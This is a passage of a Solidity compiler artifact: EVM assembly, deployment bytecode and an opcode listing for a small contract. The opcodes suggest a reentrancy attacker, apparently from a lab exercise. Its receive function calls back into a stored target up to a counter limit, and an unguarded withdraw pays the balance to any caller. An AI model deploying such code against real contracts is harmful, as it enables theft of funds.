\"#utility.yul\":10669:10673   */\n      0x00\n        /* \"#utility.yul\":10815:10844   */\n      tag_235\n        /* \"#utility.yul\":10840:10843   */\n      dup4\n        /* \"#utility.yul\":10834:10838   */\n      dup4\n        /* \"#utility.yul\":10815:10844   */\n      tag_109\n      jump\t// in\n    tag_235:\n        /* \"#utility.yul\":10807:10844   */\n      swap2\n      pop\n        /* \"#utility.yul\":10877:10880   */\n      dup3\n        /* \"#utility.yul\":10874:10875   */\n      0x02\n        /* \"#utility.yul\":10870:10881   */\n      mul\n        /* \"#utility.yul\":10864:10868   */\n      dup3\n        /* \"#utility.yul\":10861:10882   */\n      or\n        /* \"#utility.yul\":10853:10882   */\n      swap1\n      pop\n        /* \"#utility.yul\":10593:10888   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":10893:12296   */\n    tag_58:\n        /* \"#utility.yul\":11017:11061   */\n      tag_237\n        /* \"#utility.yul\":11057:11060   */\n      dup4\n        /* \"#utility.yul\":11052:11055   */\n      dup4\n        /* \"#utility.yul\":11017:11061   */\n      tag_96\n      jump\t// in\n    tag_237:\n        /* \"#utility.yul\":11126:11144   */\n      0xffffffffffffffff\n        /* \"#utility.yul\":11118:11124   */\n      dup2\n        /* \"#utility.yul\":11115:11145   */\n      gt\n        /* \"#utility.yul\":11112:11168   */\n      iszero\n      tag_238\n      jumpi\n        /* \"#utility.yul\":11148:11166   */\n      tag_239\n      tag_97\n      jump\t// in\n    tag_239:\n        /* \"#utility.yul\":11112:11168   */\n    tag_238:\n        /* \"#utility.yul\":11192:11230   */\n      tag_240\n        /* \"#utility.yul\":11224:11228   */\n      dup3\n        /* \"#utility.yul\":11218:11229   */\n      sload\n        /* \"#utility.yul\":11192:11230   */\n      tag_63\n      jump\t// in\n    tag_240:\n        /* \"#utility.yul\":11277:11344   */\n      tag_241\n        /* \"#utility.yul\":11337:11343   */\n      dup3\n        /* \"#utility.yul\":11329:11335   */\n      dup3\n        /* \"#utility.yul\":11323:11327   */\n      dup6\n        /* \"#utility.yul\":11277:11344   */\n      tag_107\n      jump\t// in\n    tag_241:\n        /* \"#utility.yul\":11371:11372   */\n      0x00\n        /* \"#utility.yul\":11400:11402   */\n      0x1f\n        /* \"#utility.yul\":11392:11398   */\n      dup4\n        /* \"#utility.yul\":11389:11403   */\n      gt\n        /* \"#utility.yul\":11417:11418   */\n      0x01\n        /* \"#utility.yul\":11412:12044   */\n      dup2\n      eq\n      tag_243\n      jumpi\n        /* \"#utility.yul\":12088:12089   */\n      0x00\n        /* \"#utility.yul\":12105:12111   */\n      dup5\n        /* \"#utility.yul\":12102:12186   */\n      iszero\n      tag_244\n      jumpi\n        /* \"#utility.yul\":12161:12170   */\n      dup3\n        /* \"#utility.yul\":12156:12159   */\n      dup8\n        /* \"#utility.yul\":12152:12171   */\n      add\n        /* \"#utility.yul\":12139:12172   */\n      calldataload\n        /* \"#utility.yul\":12130:12172   */\n      swap1\n      pop\n        /* \"#utility.yul\":12102:12186   */\n    tag_244:\n        /* \"#utility.yul\":12212:12279   */\n      tag_245\n        /* \"#utility.yul\":12272:12278   */\n      dup6\n        /* \"#utility.yul\":12265:12270   */\n      dup3\n        /* \"#utility.yul\":12212:12279   */\n      tag_110\n      jump\t// in\n    tag_245:\n        /* \"#utility.yul\":12206:12210   */\n      dup7\n        /* \"#utility.yul\":12199:12280   */\n      sstore\n        /* \"#utility.yul\":12061:12290   */\n      pop\n        /* \"#utility.yul\":11382:12290   */\n      jump(tag_242)\n        /* \"#utility.yul\":11412:12044   */\n    tag_243:\n        /* \"#utility.yul\":11464:11468   */\n      0x1f\n        /* \"#utility.yul\":11460:11469   */\n      not\n        /* \"#utility.yul\":11452:11458   */\n      dup5\n        /* \"#utility.yul\":11448:11470   */\n      and\n        /* \"#utility.yul\":11498:11535   */\n      tag_246\n        /* \"#utility.yul\":11530:11534   */\n      dup7\n        /* \"#utility.yul\":11498:11535   */\n      tag_80\n      jump\t// in\n    tag_246:\n        /* \"#utility.yul\":11557:11558   */\n      0x00\n        /* \"#utility.yul\":11571:11786   */\n    tag_247:\n        /* \"#utility.yul\":11585:11592   */\n      dup3\n        /* \"#utility.yul\":11582:11583   */\n      dup2\n        /* \"#utility.yul\":11579:11593   */\n      lt\n        /* \"#utility.yul\":11571:11786   */\n      iszero\n      tag_249\n      jumpi\n        /* \"#utility.yul\":11671:11680   */\n      dup5\n        /* \"#utility.yul\":11666:11669   */\n      dup10\n        /* \"#utility.yul\":11662:11681   */\n      add\n        /* \"#utility.yul\":11649:11682   */\n      calldataload\n        /* \"#utility.yul\":11641:11647   */\n      dup3\n        /* \"#utility.yul\":11634:11683   */\n      sstore\n        /* \"#utility.yul\":11722:11723   */\n      0x01\n        /* \"#utility.yul\":11714:11720   */\n      dup3\n        /* \"#utility.yul\":11710:11724   */\n      add\n        /* \"#utility.yul\":11700:11724   */\n      swap2\n      pop\n        /* \"#utility.yul\":11769:11771   */\n      0x20\n        /* \"#utility.yul\":11758:11767   */\n      dup6\n        /* \"#utility.yul\":11754:11772   */\n      add\n        /* \"#utility.yul\":11741:11772   */\n      swap5\n      pop\n        /* \"#utility.yul\":11608:11612   */\n      0x20\n        /* \"#utility.yul\":11605:11606   */\n      dup2\n        /* \"#utility.yul\":11601:11613   */\n      add\n        /* \"#utility.yul\":11596:11613   */\n      swap1\n      pop\n        /* \"#utility.yul\":11571:11786   */\n      jump(tag_247)\n    tag_249:\n        /* \"#utility.yul\":11814:11820   */\n      dup7\n        /* \"#utility.yul\":11805:11812   */\n      dup4\n        /* \"#utility.yul\":11802:11821   */\n      lt\n        /* \"#utility.yul\":11799:11985   */\n      iszero\n      tag_250\n      jumpi\n        /* \"#utility.yul\":11879:11888   */\n      dup5\n        /* \"#utility.yul\":11874:11877   */\n      dup10\n        /* \"#utility.yul\":11870:11889   */\n      add\n        /* \"#utility.yul\":11857:11890   */\n      calldataload\n        /* \"#utility.yul\":11922:11970   */\n      tag_251\n        /* \"#utility.yul\":11964:11968   */\n      0x1f\n        /* \"#utility.yul\":11956:11962   */\n      dup10\n        /* \"#utility.yul\":11952:11969   */\n      and\n        /* \"#utility.yul\":11941:11950   */\n      dup3\n        /* \"#utility.yul\":11922:11970   */\n      tag_109\n      jump\t// in\n    tag_251:\n        /* \"#utility.yul\":11914:11920   */\n      dup4\n        /* \"#utility.yul\":11907:11971   */\n      sstore\n        /* \"#utility.yul\":11822:11985   */\n      pop\n        /* \"#utility.yul\":11799:11985   */\n    tag_250:\n        /* \"#utility.yul\":12031:12032   */\n      0x01\n        /* \"#utility.yul\":12027:12028   */\n      0x02\n        /* \"#utility.yul\":12019:12025   */\n      dup9\n        /* \"#utility.yul\":12015:12029   */\n      mul\n        /* \"#utility.yul\":12011:12033   */\n      add\n        /* \"#utility.yul\":12005:12009   */\n      dup9\n        /* \"#utility.yul\":11998:12034   */\n      sstore\n        /* \"#utility.yul\":11419:12044   */\n      pop\n      pop\n      pop\n        /* \"#utility.yul\":11382:12290   */\n    tag_242:\n      pop\n        /* \"#utility.yul\":10992:12296   */\n      pop\n      pop\n      pop\n        /* \"#utility.yul\":10893:12296   */\n      pop\n      pop\n      pop\n      jump\t// out\n\n    auxdata: 0xa2646970667358221220023cbb47e2017772eac73c0a94d9d60bfc868d37886b9c7ee24bc447a7a3967d64736f6c634300081e0033\n}\n",
				"bytecode": {
					"linkReferences": {},
					"object": "6080604052604051610c44380380610c44833981810160405281019061002591906100c8565b805f5f6101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550506100f3565b5f5ffd5b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f6100978261006e565b9050919050565b6100a78161008d565b81146100b1575f5ffd5b50565b5f815190506100c28161009e565b92915050565b5f602082840312156100dd576100dc61006a565b5b5f6100ea848285016100b4565b91505092915050565b610b44806101005f395ff3fe60806040526004361061004d575f3560e01c80633ccfd60b146102245780635bc055261461023a578063aabb755414610264578063f2ceb75f14610280578063fdfd5917146102aa57610054565b3661005457005b60025f815480929190610066906104a1565b919050555060015f5f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663c12327b8306040518263ffffffff1660e01b81526004016100c69190610527565b602060405180830381865afa1580156100e1573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906101059190610572565b1115610197575f5f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16631d86b16760016040518263ffffffff1660e01b8152600401610165919061069d565b5f604051808303815f87803b15801561017c575f5ffd5b505af115801561018e573d5f5f3e3d5ffd5b50505050610222565b60036002541015610221575f5f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16632e64cec160046040518263ffffffff1660e01b81526004015f604051808303818588803b158015610209575f5ffd5b505af115801561021b573d5f5f3e3d5ffd5b50505050505b5b005b34801561022f575f5ffd5b506102386102d4565b005b348015610245575f5ffd5b5061024e61031a565b60405161025b9190610718565b60405180910390f35b61027e60048036038101906102799190610792565b61033e565b005b34801561028b575f5ffd5b506102946103d9565b6040516102a191906107ec565b60405180910390f35b3480156102b5575f5ffd5b506102be6103df565b6040516102cb9190610865565b60405180910390f35b3373ffffffffffffffffffffffffffffffffffffffff166108fc4790811502906040515f60405180830381858888f19350505050158015610317573d5f5f3e3d5ffd5b50565b5f5f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b81816001918261034f929190610a41565b505f6002819055505f5f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16632e64cec160046040518263ffffffff1660e01b81526004015f604051808303818588803b1580156103be575f5ffd5b505af11580156103d0573d5f5f3e3d5ffd5b50505050505050565b60025481565b600180546103ec906105ca565b80601f0160208091040260200160405190810160405280929190818152602001828054610418906105ca565b80156104635780601f1061043a57610100808354040283529160200191610463565b820191905f5260205f20905b81548152906001019060200180831161044657829003601f168201915b505050505081565b7f4e487b71000000000000000000000000000000000000000000000000000000005f52601160045260245ffd5b5f819050919050565b5f6104ab82610498565b91507fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff82036104dd576104dc61046b565b5b600182019050919050565b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f610511826104e8565b9050919050565b61052181610507565b82525050565b5f60208201905061053a5f830184610518565b92915050565b5f5ffd5b5f5ffd5b61055181610498565b811461055b575f5ffd5b50565b5f8151905061056c81610548565b92915050565b5f6020828403121561058757610586610540565b5b5f6105948482850161055e565b91505092915050565b7f4e487b71000000000000000000000000000000000000000000000000000000005f52602260045260245ffd5b5f60028204905060018216806105e157607f821691505b6020821081036105f4576105f361059d565b5b50919050565b5f82825260208201905092915050565b5f819050815f5260205f209050919050565b5f8154610628816105ca565b61063281866105fa565b9450600182165f811461064c576001811461066257610694565b60ff198316865281151560200286019350610694565b61066b8561060a565b5f5b8381101561068c5781548189015260018201915060208101905061066d565b808801955050505b50505092915050565b5f6020820190508181035f8301526106b5818461061c565b905092915050565b5f819050919050565b5f6106e06106db6106d6846104e8565b6106bd565b6104e8565b9050919050565b5f6106f1826106c6565b9050919050565b5f610702826106e7565b9050919050565b610712816106f8565b82525050565b5f60208201905061072b5f830184610709565b92915050565b5f5ffd5b5f5ffd5b5f5ffd5b5f5f83601f84011261075257610751610731565b5b8235905067ffffffffffffffff81111561076f5761076e610735565b5b60208301915083600182028301111561078b5761078a610739565b5b9250929050565b5f5f602083850312156107a8576107a7610540565b5b5f83013567ffffffffffffffff8111156107c5576107c4610544565b5b6107d18582860161073d565b92509250509250929050565b6107e681610498565b82525050565b5f6020820190506107ff5f8301846107dd565b92915050565b5f81519050919050565b8281835e5f83830152505050565b5f601f19601f8301169050919050565b5f61083782610805565b61084181856105fa565b935061085181856020860161080f565b61085a8161081d565b840191505092915050565b5f6020820190508181035f83015261087d818461082d565b905092915050565b5f82905092915050565b7f4e487b71000000000000000000000000000000000000000000000000000000005f52604160045260245ffd5b5f6020601f8301049050919050565b5f82821b905092915050565b5f600883026109067fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff826108cb565b61091086836108cb565b95508019841693508086168417925050509392505050565b5f61094261093d61093884610498565b6106bd565b610498565b9050919050565b5f819050919050565b61095b83610928565b61096f61096782610949565b8484546108d7565b825550505050565b5f5f905090565b610986610977565b610991818484610952565b505050565b5b818110156109b4576109a95f8261097e565b600181019050610997565b5050565b601f8211156109f9576109ca8161060a565b6109d3846108bc565b810160208510156109e2578190505b6109f66109ee856108bc565b830182610996565b50505b505050565b5f82821c905092915050565b5f610a195f19846008026109fe565b1980831691505092915050565b5f610a318383610a0a565b9150826002028217905092915050565b610a4b8383610885565b67ffffffffffffffff811115610a6457610a6361088f565b5b610a6e82546105ca565b610a798282856109b8565b5f601f831160018114610aa6575f8415610a94578287013590505b610a9e8582610a26565b865550610b05565b601f198416610ab48661060a565b5f5b82811015610adb57848901358255600182019150602085019450602081019050610ab6565b86831015610af85784890135610af4601f891682610a0a565b8355505b6001600288020188555050505b5050505050505056fea2646970667358221220023cbb47e2017772eac73c0a94d9d60bfc868d37886b9c7ee24bc447a7a3967d64736f6c634300081e0033",
					"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x40 MLOAD PUSH2 0xC44 CODESIZE SUB DUP1 PUSH2 0xC44 DUP4 CODECOPY DUP2 DUP2 ADD PUSH1 0x40 MSTORE DUP2 ADD SWAP1 PUSH2 0x25 SWAP2 SWAP1 PUSH2 0xC8 JUMP JUMPDEST DUP1 PUSH0 PUSH0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP POP PUSH2 0xF3 JUMP JUMPDEST PUSH0 PUSH0 REVERT JUMPDEST PUSH0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0x97 DUP3 PUSH2 0x6E JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0xA7 DUP2 PUSH2 0x8D JUMP JUMPDEST DUP2 EQ PUSH2 0xB1 JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP JUMP JUMPDEST PUSH0 DUP2 MLOAD SWAP1 POP PUSH2 0xC2 DUP2 PUSH2 0x9E JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0xDD JUMPI PUSH2 0xDC PUSH2 0x6A JUMP JUMPDEST JUMPDEST PUSH0 PUSH2 0xEA DUP5 DUP3 DUP6 ADD PUSH2 0xB4 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH2 0xB44 DUP1 PUSH2 0x100 PUSH0 CODECOPY PUSH0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH2 0x4D JUMPI PUSH0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x3CCFD60B EQ PUSH2 0x224 JUMPI DUP1 PUSH4 0x5BC05526 EQ PUSH2 0x23A JUMPI DUP1 PUSH4 0xAABB7554 EQ PUSH2 0x264 JUMPI DUP1 PUSH4 0xF2CEB75F EQ PUSH2 0x280 JUMPI DUP1 PUSH4 0xFDFD5917 EQ PUSH2 0x2AA JUMPI PUSH2 0x54 JUMP JUMPDEST CALLDATASIZE PUSH2 0x54 JUMPI STOP JUMPDEST PUSH1 0x2 PUSH0 DUP2 SLOAD DUP1 SWAP3 SWAP2 SWAP1 PUSH2 0x66 SWAP1 PUSH2 0x4A1 JUMP JUMPDEST SWAP2 SWAP1 POP SSTORE POP PUSH1 0x1 PUSH0 PUSH0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0xC12327B8 ADDRESS PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0xC6 SWAP2 SWAP1 PUSH2 0x527 JUMP JUMPDEST PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0xE1 JUMPI RETURNDATASIZE PUSH0 PUSH0 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x105 SWAP2 SWAP1 PUSH2 0x572 JUMP JUMPDEST GT ISZERO PUSH2 0x197 JUMPI PUSH0 PUSH0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x1D86B167 PUSH1 0x1 PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x165 SWAP2 SWAP1 PUSH2 0x69D JUMP JUMPDEST PUSH0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x17C JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x18E JUMPI RETURNDATASIZE PUSH0 PUSH0 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP POP POP POP PUSH2 0x222 JUMP JUMPDEST PUSH1 0x3 PUSH1 0x2 SLOAD LT ISZERO PUSH2 0x221 JUMPI PUSH0 PUSH0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x2E64CEC1 PUSH1 0x4 PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP9 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x209 JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x21B JUMPI RETURNDATASIZE PUSH0 PUSH0 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP POP POP POP POP JUMPDEST JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x22F JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP PUSH2 0x238 PUSH2 0x2D4 JUMP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x245 JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP PUSH2 0x24E PUSH2 0x31A JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x25B SWAP2 SWAP1 PUSH2 0x718 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x27E PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0x279 SWAP2 SWAP1 PUSH2 0x792 JUMP JUMPDEST PUSH2 0x33E JUMP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x28B JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP PUSH2 0x294 PUSH2 0x3D9 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x2A1 SWAP2 SWAP1 PUSH2 0x7EC JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x2B5 JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP PUSH2 0x2BE PUSH2 0x3DF JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x2CB SWAP2 SWAP1 PUSH2 0x865 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH2 0x8FC SELFBALANCE SWAP1 DUP2 ISZERO MUL SWAP1 PUSH1 0x40 MLOAD PUSH0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP9 DUP9 CALL SWAP4 POP POP POP POP ISZERO DUP1 ISZERO PUSH2 0x317 JUMPI RETURNDATASIZE PUSH0 PUSH0 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP JUMP JUMPDEST PUSH0 PUSH0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 JUMP JUMPDEST DUP2 DUP2 PUSH1 0x1 SWAP2 DUP3 PUSH2 0x34F SWAP3 SWAP2 SWAP1 PUSH2 0xA41 JUMP JUMPDEST POP PUSH0 PUSH1 0x2 DUP2 SWAP1 SSTORE POP PUSH0 PUSH0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x2E64CEC1 PUSH1 0x4 PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP9 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x3BE JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x3D0 JUMPI RETURNDATASIZE PUSH0 PUSH0 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP POP POP POP POP POP POP JUMP JUMPDEST PUSH1 0x2 SLOAD DUP2 JUMP JUMPDEST PUSH1 0x1 DUP1 SLOAD PUSH2 0x3EC SWAP1 PUSH2 0x5CA JUMP JUMPDEST DUP1 PUSH1 0x1F ADD PUSH1 0x20 DUP1 SWAP2 DIV MUL PUSH1 0x20 ADD PUSH1 0x40 MLOAD SWAP1 DUP2 ADD PUSH1 0x40 MSTORE DUP1 SWAP3 SWAP2 SWAP1 DUP2 DUP2 MSTORE PUSH1 0x20 ADD DUP3 DUP1 SLOAD PUSH2 0x418 SWAP1 PUSH2 0x5CA JUMP JUMPDEST DUP1 ISZERO PUSH2 0x463 JUMPI DUP1 PUSH1 0x1F LT PUSH2 0x43A JUMPI PUSH2 0x100 DUP1 DUP4 SLOAD DIV MUL DUP4 MSTORE SWAP2 PUSH1 0x20 ADD SWAP2 PUSH2 0x463 JUMP JUMPDEST DUP3 ADD SWAP2 SWAP1 PUSH0 MSTORE PUSH1 0x20 PUSH0 KECCAK256 SWAP1 JUMPDEST DUP2 SLOAD DUP2 MSTORE SWAP1 PUSH1 0x1 ADD SWAP1 PUSH1 0x20 ADD DUP1 DUP4 GT PUSH2 0x446 JUMPI DUP3 SWAP1 SUB PUSH1 0x1F AND DUP3 ADD SWAP2 JUMPDEST POP POP POP POP POP DUP2 JUMP JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH0 MSTORE PUSH1 0x11 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH0 REVERT JUMPDEST PUSH0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0x4AB DUP3 PUSH2 0x498 JUMP JUMPDEST SWAP2 POP PUSH32 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 SUB PUSH2 0x4DD JUMPI PUSH2 0x4DC PUSH2 0x46B JUMP JUMPDEST JUMPDEST PUSH1 0x1 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0x511 DUP3 PUSH2 0x4E8 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x521 DUP2 PUSH2 0x507 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x53A PUSH0 DUP4 ADD DUP5 PUSH2 0x518 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH0 REVERT JUMPDEST PUSH0 PUSH0 REVERT JUMPDEST PUSH2 0x551 DUP2 PUSH2 0x498 JUMP JUMPDEST DUP2 EQ PUSH2 0x55B JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP JUMP JUMPDEST PUSH0 DUP2 MLOAD SWAP1 POP PUSH2 0x56C DUP2 PUSH2 0x548 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x587 JUMPI PUSH2 0x586 PUSH2 0x540 JUMP JUMPDEST JUMPDEST PUSH0 PUSH2 0x594 DUP5 DUP3 DUP6 ADD PUSH2 0x55E JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH0 MSTORE PUSH1 0x22 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH0 REVERT JUMPDEST PUSH0 PUSH1 0x2 DUP3 DIV SWAP1 POP PUSH1 0x1 DUP3 AND DUP1 PUSH2 0x5E1 JUMPI PUSH1 0x7F DUP3 AND SWAP2 POP JUMPDEST PUSH1 0x20 DUP3 LT DUP2 SUB PUSH2 0x5F4 JUMPI PUSH2 0x5F3 PUSH2 0x59D JUMP JUMPDEST JUMPDEST POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 DUP3 DUP3 MSTORE PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 DUP2 SWAP1 POP DUP2 PUSH0 MSTORE PUSH1 0x20 PUSH0 KECCAK256 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 DUP2 SLOAD PUSH2 0x628 DUP2 PUSH2 0x5CA JUMP JUMPDEST PUSH2 0x632 DUP2 DUP7 PUSH2 0x5FA JUMP JUMPDEST SWAP5 POP PUSH1 0x1 DUP3 AND PUSH0 DUP2 EQ PUSH2 0x64C JUMPI PUSH1 0x1 DUP2 EQ PUSH2 0x662 JUMPI PUSH2 0x694 JUMP JUMPDEST PUSH1 0xFF NOT DUP4 AND DUP7 MSTORE DUP2 ISZERO ISZERO PUSH1 0x20 MUL DUP7 ADD SWAP4 POP PUSH2 0x694 JUMP JUMPDEST PUSH2 0x66B DUP6 PUSH2 0x60A JUMP JUMPDEST PUSH0 JUMPDEST DUP4 DUP2 LT ISZERO PUSH2 0x68C JUMPI DUP2 SLOAD DUP2 DUP10 ADD MSTORE PUSH1 0x1 DUP3 ADD SWAP2 POP PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH2 0x66D JUMP JUMPDEST DUP1 DUP9 ADD SWAP6 POP POP POP JUMPDEST POP POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH0 DUP4 ADD MSTORE PUSH2 0x6B5 DUP2 DUP5 PUSH2 0x61C JUMP JUMPDEST SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0x6E0 PUSH2 0x6DB PUSH2 0x6D6 DUP5 PUSH2 0x4E8 JUMP JUMPDEST PUSH2 0x6BD JUMP JUMPDEST PUSH2 0x4E8 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0x6F1 DUP3 PUSH2 0x6C6 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0x702 DUP3 PUSH2 0x6E7 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x712 DUP2 PUSH2 0x6F8 JUMP 